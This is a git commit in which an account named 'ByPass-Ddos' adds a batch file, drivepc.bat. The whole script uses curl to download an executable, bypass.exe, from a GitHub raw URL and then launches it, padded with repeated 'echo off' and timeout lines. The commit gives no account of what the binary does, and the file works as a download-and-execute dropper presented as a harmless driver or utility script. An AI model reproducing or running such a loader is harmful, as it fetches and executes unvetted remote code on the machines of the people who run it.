6208558b43ac2929ef53769815a7110ad6769082
ByPass-Ddos <82685280+SERVERGAME2024@users.noreply.github.com>
2024-10-12 23:30:05 +0700

    Add files via upload

---
+++ drivepc.bat
@@ -0,0 +1,13 @@
+echo off
+curl  https://github.com/SERVERGAME2024/yrdy/raw/refs/heads/main/bypass.exe -o bypass.exe
+echo off
+timeout 5
+echo off
+start bypass.exe
+echo off
+timeout 2
+echo off
+timeout 2
+echo off
+echo
+
